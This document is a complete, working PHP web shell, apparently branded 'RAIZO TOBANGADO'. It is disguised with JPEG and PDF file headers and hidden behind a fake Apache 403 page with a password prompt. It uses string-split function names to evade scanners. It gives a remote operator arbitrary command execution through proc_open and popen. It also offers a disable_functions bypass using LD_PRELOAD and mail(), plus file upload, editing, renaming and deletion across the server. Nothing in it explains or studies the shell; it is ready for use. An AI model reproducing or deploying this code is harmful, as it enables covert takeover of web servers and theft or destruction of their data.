ÿØÿàQ %PDF-1.3<?php
$password = "Kontolkudangaceng69%$"; // passwod
session_start();
error_reporting(0);
set_time_limit(0);
ini_set("memory_limit",-1);
$sessioncode = md5(__FILE__);
if(!empty($password) and $_SESSION[$sessioncode] != $password){
    if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {
        $_SESSION[$sessioncode] = $password;
    }
    else {
        print "
<html><head>
<title>403 Forbidden</title>
</head>
<body><h1>Forbidden</h1>
<p>You don't have permission to access this page on this server.</p>
<hr>
<address>Apache Server at ".$_SERVER["HTTP_HOST"]." Port 80 </address>
<style>
input { margin:0;background-color:#fff;border:1px solid #fff; }
</style>
<center>
</body>
<pre align=center><font>
</font><form method=post> <input type='password' name='pass'></form></pre>";
        exit;        
    }
}
?>
%PDF-1.3
<!DOCTYPE html>
<html>
<head>
    <title>RAIZO TOBANGADO</title>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name='robots' content='noindex, nofollow, noarchive'>
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300..700&display=swap" rel="stylesheet">
    
    <style>
    body {
        font-family: "Space Grotesk", sans-serif;
        color: #fff;
        margin: 0;
        padding: 0;
        background-color: #000;
    }

    .result-box-container {
    position: relative;
    margin-top: 20px;
}

.result-box {
    width: 100%;
    height: 200px;
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 5px;
    background-color: #333;
    overflow: auto;
    box-sizing: border-box;
    font-family: "Space Grotesk", sans-serif;
    color: #fff;
    resize: both;
    min-height: 100px;
    max-height: 500px;
}

.result-box::placeholder {
    color: #999;
}

.result-box:focus {
    outline: none;
    border-color: #fff;
}

.result-box::-webkit-scrollbar {
    width: 8px;
}

.result-box::-webkit-scrollbar-thumb {
    background-color: #53585d;
    border-radius: 4px;
}


    .container {
        max-width: 90%;
        margin: 20px auto;
        padding: 20px;
        background-color: #1a1a1a;
        border-radius: 44px;
        box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
    }

    .header {
        text-align: center;
        margin-bottom: 20px;
    }

    .header h1 {
        font-size: 24px;
        color: #fff;
    }

    .subheader {
        text-align: center;
        margin-bottom: 20px;
    }

    .subheader p {
        font-size: 16px;
        font-style: italic;
        color: #ccc;
    }

    form {
        margin-bottom: 20px;
    }

    form input[type="text"],
    form textarea {
        padding: 8px;
        margin-bottom: 10px;
        border: 1px solid #fff;
        border-radius: 3px;
        box-sizing: border-box;
        background-color: #333;
        color: #fff;
    }

    form input[type="submit"] {
        padding: 10px;
        background-color: #53585d;
        color: white;
        border: none;
        border-radius: 3px;
        cursor: pointer;
    }

    form input[type="file"] {
        padding: 7px;
        background-color: #53585d;
        color: white;
        border: none;
        border-radius: 3px;
        cursor: pointer;
    }

    form input[type="submit"]:hover {
        background-color: #143015;
    }

    .result-box {
        width: 100%;
        height: 200px;
        resize: none;
        overflow: auto;
        font-family: 'Arial Black';
        background-color: #333;
        color: #fff;
        padding: 10px;
        border: 1px solid #ddd;
        margin-bottom: 10px;
    }

    table {
        width: 100%;
        border-collapse: collapse;
        margin-top: 20px;
        color: #fff;
    }

    th, td {
        padding: 8px;
        text-align: left;
    }

    th {
        background-color: #444;
    }

    tr:nth-child(even) {
        background-color: #333;
    }

    .item-name {
        max-width: 200px;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
    }

    .size, .date {
        width: 100px;
    }

    .permission {
        font-weight: bold;
        width: 50px;
        text-align: center;
    }

    .writable {
        color: #0db202;
    }

    .not-writable {
        color: #d60909;
    }

    textarea[name="file_content"] {
        width: calc(100.9% - 10px);
        margin-bottom: 10px;
        padding: 8px;
        max-height: 500px;
        resize: vertical;
        border: 1px solid #ddd;
        border-radius: 3px;
        font-family: 'Arial Black';
        background-color: #333;
        color: #fff;
    }

a {
    color: #00ff00;
    text-decoration: none;
}

a:hover {
    color: #b3ffb3;
}

</style>

</head>
<body>
<div class="container">
<?php
error_reporting(0);
$chd = "c"."h"."d"."i"."r";
$expl = "e"."x"."p"."l"."o"."d"."e";
$scd = "s"."c"."a"."n"."d"."i"."r";
$ril = "r"."e"."a"."l"."p"."a"."t"."h";
$st = "s"."t"."a"."t";
$isdir = "i"."s"."_"."d"."i"."r";
$isw = "i"."s"."_"."w"."r"."i"."t"."a"."b"."l"."e";
$mup = "m"."o"."v"."e"."_"."u"."p"."l"."o"."a"."d"."e"."d"."_"."f"."i"."l"."e";
$bs = "b"."a"."s"."e"."n"."a"."m"."e";
$htm = "h"."t"."m"."l"."s"."p"."e"."c"."i"."a"."l"."c"."h"."a"."r"."s";
$fpc = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$mek = "m"."k"."d"."i"."r";
$fgc = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$drnmm = "d"."i"."r"."n"."a"."m"."e";
$unl = "u"."n"."l"."i"."n"."k";
$timezone = date_default_timezone_get();
date_default_timezone_set($timezone);
$rootDirectory = $ril($_SERVER['\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54']);
$scriptDirectory = $drnmm(__FILE__);

function x($b) {

    $be = "ba"."se"."64"."_"."en"."co"."de";
    return $be($b);
}

function y($b) {
    $bd = "ba"."se"."64"."_"."de"."co"."de";
    return $bd($b);
}
if(function_exists('mail')) {
    $mail = "<font color='white'> [ mail() :</font><font color='lime'> 0N </font> ] ";
} else {
    $mail = "<font color='white'> [ mail() :</font><font color='red'> 0FF </font> ] ";
}
if(function_exists('mb_send_mail')) {
  $mbb = "<font color='white'> [ mb_send_mail() :</font><font color='lime'> 0N </font> ] ";
}else{
   $mbb = "<font color='white'> [ mb_send_mail() :</font><font color='red'> 0FF </font> ] ";
}
if(function_exists('error_log')) {
  $errr = "<font color='white'> [ error_log() :</font><font color='lime'> 0N </font> ] ";
}else{
  $errr = "<font color='white'> [ error_log() :</font><font color='red'> 0FF </font> ] ";
}
if(function_exists('imap_mail')) {
  $impp = "<font color='white'> [ imap_mail() :</font><font color='lime'> 0N </font> ] ";
}else{
  $impp = "<font color='white'> [ imap_mail() :</font><font color='red'> 0FF </font> ] <br>";
}

echo "<font color='white'> [ C0MM4ND BYP4SS! <i style='color:gray'>status wajib on mail putenv</i>  ]</font><br>";
if (function_exists('mail')) {
    echo $mail." ".$mbb." ".$errr." ".$impp;
} else {
    echo $mail." ".$mbb." ".$errr." ".$impp;
}
if (function_exists('putenv')) {
    echo "<font color='white'> [ Function putenv() :</font><font color='lime'> 0N </font> ] <br>";
} else {
    echo "<font color='white'> [ Function putenv() :<font color='red'> 0FF </font> ] <br>";
}
foreach ($_GET as $c => $d) $_GET[$c] = y($d);

$currentDirectory = $ril(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
$chd($currentDirectory);

$viewC0MM4NDResult = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['filetos'])) {
        $target_file = $currentDirectory . '/' . $bs($_FILES["filetos"]["name"]);
        if ($mup($_FILES["filetos"]["tmp_name"], $target_file)) {
            echo "<hr>F1L3 <i style=color:red;>" . $htm($bs($_FILES["filetos"]["name"])) . "</i> UPL04D SUCCESS<hr>";
        } else {
            echo "<hr>S0RRY, TH3R3 W4S AN ERR0R UPLOADING YOUR F1LE.<hr>";
        }
    } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        $ff = $_POST['folder_name'];
        $newF0LD3R = $currentDirectory . '/' . $ff;
        if (!file_exists($newfolder)) {
            if ($mek($newF0LD3R) !== false) {
                echo '<hr>F0LD3R CR34T3D SUCCESSFULLY!';
            }else{
                echo '<hr>ERR0R: F4ILED T0 CR34T3 F0LD3R!';
            }
        }

    } elseif (isset($_POST['file_name'])) {
        $fileN4M3 = $_POST['file_name'];
        $newF1L3 = $currentDirectory . '/' . $fileN4M3;
        if (!file_exists($newF1L3)) {
            if ($fpc($newF1L3, '') !== false) {
                echo '<hr>F1L3 <i style=color:red;>' . $fileN4M3 .'</i> CR34T3D SUCCESSFULLY!';
                $fileToV13W = $newF1L3;
                if (file_exists($fileToV13W)) {
                    $fileContent = $fgc($fileToV13W);
                    $viewC0MM4NDResult = '<hr><p>R3SULT: ' . $fileN4M3 . '</p>
                    <form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
                    <textarea name="content" class="result-box">' . $htm($fileContent) . '</textarea><td>
                    <input type="hidden" name="edit_file" value="' . $fileN4M3 . '">
                    <input type="submit" value=" Save "></form></td>';
                } else {
                    $viewC0MM4NDResult = '<hr><p>ERR0R: F1L3 N0T F0UND!</p>';
                }
            } else {
                echo '<hr>ERR0R: F41LED T0 CR34T3 F1L3!';
            }
        }else{
            echo '<hr>ERR0R: F1L3 ALR34DY EX1STS!';
        }
    } elseif (isset($_POST['cmd_input'])){
        $p = "p"."u"."t"."e"."n"."v";
        $a = "fi"."le_p"."ut_c"."ont"."e"."nt"."s";
        $m = "m"."a"."i"."l";
        $base = "ba"."se"."64"."_"."de"."co"."de";
        $en = "ba"."se"."64"."_"."en"."co"."de";
        $mb = "m"."b"."_"."s"."e"."n"."d"."_"."m"."a"."i"."l";
        $err = "e"."r"."r"."o"."r"."_"."l"."o"."g";
        $drnm = "d"."i"."r"."n"."a"."m"."e";
        $imp = "i"."m"."a"."p"."_"."m"."a"."i"."l";
        $currentF1L3Path = $_SERVER['PHP_SELF'];
        $doc = $_SERVER['DOCUMENT_ROOT'];
        $directoryPath = $drnm($currentF1L3Path);
        $full = $doc . $directoryPath;
        $hook = '';
        $cmdd = $_POST['cmd_input'];
        $meterpreter = $en($cmdd." > test.txt");
        $viewC0MM4NDResult = '<hr><p>R3SULT: <font color="white">base64 : ' . $meterpreter .'</br>Please Refresh and Check F1L3 test.txt, this output command<br>test.txt created = VULN<br>test.txt not created = NOT VULN<br>example access: domain.com/yourpath/path/test.txt<br>Powered By Tobanga</font><br><br></textarea>';
        $a($full . '/chankro.so', $base($hook));
        $a($full . '/acpid.socket', $base($meterpreter));
        $p('CHANKRO=' . $full . '/acpid.socket');
        $p('LD_PRELOAD=' . $full . '/chankro.so');
        if(function_exists('mail')) {
            $m('a','a','a','a');
        } elseif(function_exists('mb_send_mail')) {
            $mb('a','a','a','a');
        } elseif(function_exists('error_log')) {
            $err('a',1,'a');
        } elseif(function_exists('imap_mail')) {
            $imp('a','a','a');
        }

    }elseif (isset($_POST['delete_file'])) {
        $fileToD3L3T3 = $currentDirectory . '/' . $_POST['delete_file'];
        if (file_exists($fileToD3L3T3)) {
            if (is_dir($fileToD3L3T3)) {
                if (deleteDirectory($fileToD3L3T3)) {
                    echo '<hr>F0LD3R D3L3T3D SUCCESSFULLY!';
                } else {
                    echo '<hr>ERR0R: F4IL3D T0 D3L3TE F0LDER!';
                }
            } else {
                if ($unl($fileToD3L3T3)) {
                    echo '<hr>F1L3 D3L3T3D SUCCESSFULLY!';
                } else {
                    echo '<hr>ERR0R: F4IL3D T0 D3L3TE F1L3!';
                }
            }
        } else {
            echo '<hr>ERROR: F1L3 OR D1R3CTORY N0T F0UND!';
        }
    } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
        $oldN4M3 = $currentDirectory . '/' . $_POST['old_name'];
        $newN4M3 = $currentDirectory . '/' . $_POST['new_name'];
        if (file_exists($oldN4M3)) {
            if (rename($oldN4M3, $newN4M3)) {
                echo '<hr>IT3M R3N4M3D SUCCESSFULLY!';
            } else {
                echo '<hr>ERR0R: F4IL3D TO R3N4ME 1TEM!';
            }
        } else {
            echo '<hr>ERROR: 1T3M N0T F0UND!';
        }
    }elseif (isset($_POST['cmd_biasa'])) {
        $pp = "p"."r"."o"."c"."_"."o"."p"."e"."n";
        $pc = "f"."c"."l"."o"."s"."e";
        $ppc = "p"."r"."o"."c"."_"."c"."l"."o"."s"."e";
        $stg = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
        $popx = "p"."o"."p"."e"."n";
        $pclose = "p"."c"."l"."o"."s"."e";

        $command = $_POST['cmd_biasa'];
        $descriptorspec = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = $pp($command, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = $stg($pipes[1]);
            $errors = $stg($pipes[2]);
            $pc($pipes[1]);
            $pc($pipes[2]);
            $ppc($process);
            if (!empty($errors)) {
                $viewC0MM4NDResult = '<hr><p>ERR0R: </p><textarea class="result-box">' . $htm($errors) . '</textarea>';
            } else {
                $viewC0MM4NDResult = '<hr><p>R3SULT: </p><textarea class="result-box">' . $htm($output) . '</textarea>';
            }
        } else {
            $handle = $popx($command . " 2>&1", 'r');
            if ($handle) {
                $output = '';
                while (!feof($handle)) {
                    $output .= fread($handle, 4096);
                }
                $pclose($handle);
                $viewC0MM4NDResult = '<hr><p>R3SULT: </p><textarea class="result-box">' . htmlspecialchars($output) . '</textarea>';
            } else {
                $viewC0MM4NDResult = '<hr><p>ERR0R: Failed to execute! </p>';
            }
        }
    }
     elseif (isset($_POST['view_file'])) {
        $fileToV13W = $currentDirectory . '/' . $_POST['view_file'];
        if (file_exists($fileToV13W)) {
            $fileContent = $fgc($fileToV13W);
            $viewC0MM4NDResult = '<hr><p>R3SULT: ' . $_POST['view_file'] . '</p>
            <form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
            <textarea name="content" class="result-box">' . $htm($fileContent) . '</textarea><td>
            <input type="hidden" name="edit_file" value="' . $_POST['view_file'] . '">
            <input type="submit" value=" Save "></form></td>';
        } else {
            $viewC0MM4NDResult = '<hr><p>ERR0R: F1L3 N0T F0UND!</p>';
        }
    }  elseif (isset($_POST['edit_file'])) {
        $ef = $currentDirectory . '/' . $_POST['edit_file'];
        $newContent = $_POST['content'];
        if ($fpc($ef, $newContent) !== false) {
            echo '<hr>F1L3 <i style=color:red;>' . $_POST['edit_file'].' 3D1T3D 0K<hr>';
        } else {
            echo '<hr>ERR0R: 3D1T F1L3 <i style=color:red;> ' . $_POST['edit_file'].' F41L3D!<hr>';

        }
    }

}

echo '<hr>D1R: ';

$directories = $expl(DIRECTORY_SEPARATOR, $currentDirectory);
$currentPath = '';
$homeLinkPrinted = false;
foreach ($directories as $index => $dir) {
    $currentPath .= DIRECTORY_SEPARATOR . $dir;
    if ($index == 0) {
        echo '/<a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
    } else {
        echo '/<a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
    }
}

echo '<a href="?d=' . x($scriptDirectory) . '"><font style="color:white";>/</font> <span style="color: white;">-> H0M3</span></a>';
echo '<br>';
echo '<hr><form method="post" enctype="multipart/form-data">';
echo '<input type="file" name="filetos" id="filetos" placeholder="pilih file:">';
echo '<input type="submit" value="UPL04D!" name="submit">';
echo '</form><hr>';
echo '<table border="5"><tbody>
<tr>
<td>
<center>C0MM4ND [byp4ss]<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
<input type="text" name="cmd_input" placeholder="whoami"><input type="submit" value="RUN C0MM4ND"></form></center></td>

<td><center>C0MM4ND<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
<input type="text" name="cmd_biasa" placeholder="whoami"><input type="submit" value="RUN C0MM4ND"></form><center></td>

<td><center>CR3AT3 F0LD3R<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
<input type="text" name="folder_name" placeholder="F0LD3R N4M3"><input type="submit" value="CR3AT3 F0LD3R"></form><center></td>
<td><center>CR3AT3 F1L3<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
<input type="text" name="file_name" placeholder="F1L3 N4M3"><input type="submit" value="CR3AT3 F1L3"></form></td></tr>
</tbody></table>';
echo $viewC0MM4NDResult;
echo '<table border=1>';
echo '<br><tr><th><center>IT3M N4M3</th><th><center>S1Z3</th><th><center>D4T3</th><th>P3RMISSI0NZ</th><th><center>V13W</th><th><center>D3L3T3</th><th><center>R3NAM3</th></tr></center></center></center>';
foreach ($scd($currentDirectory) as $v) {
    $u = $ril($v);
    $s = $st($u);
    $itemLink = $isdir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?'.('d='.x($currentDirectory).'&f='.x($v));
    $permission = substr(sprintf('%o', fileperms($u)), -4);
    $writable = $isw($u);
    echo '<tr>
            <td class="item-name"><a href="'.$itemLink.'">'.$v.'</a></td>
            <td class="size">'.filesize($u).'</td>
            <td class="date" style="text-align: center;">'.date('Y-m-d H:i:s', filemtime($u)).'</td>
            <td class="permission '.($writable ? 'writable' : 'not-writable').'">'.$permission.'</td>
            <td><center><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="view_file" value="'.$htm($v).'"><input type="submit" value=" V13W "></form></center></td>
            <td><center><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="delete_file" value="'.$htm($v).'"><input type="submit" value="D3L3T3"></form></center></td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="old_name" value="'.$htm($v).'"><input type="text" name="new_name" placeholder="N3W N4M3"><input type="submit" name="rename_item" value="R3NAM3"></form></td>
        </tr>';

}

echo '</table>';
function deleteDirectory($dir) {
   $unl = "u"."n"."l"."i"."n"."k";
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return $unl($dir);
    }
    $scd = "s"."c"."a"."n"."d"."i"."r";
    foreach ($scd($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
            return false;
        }
    }
    return rmdir($dir);
}
?>
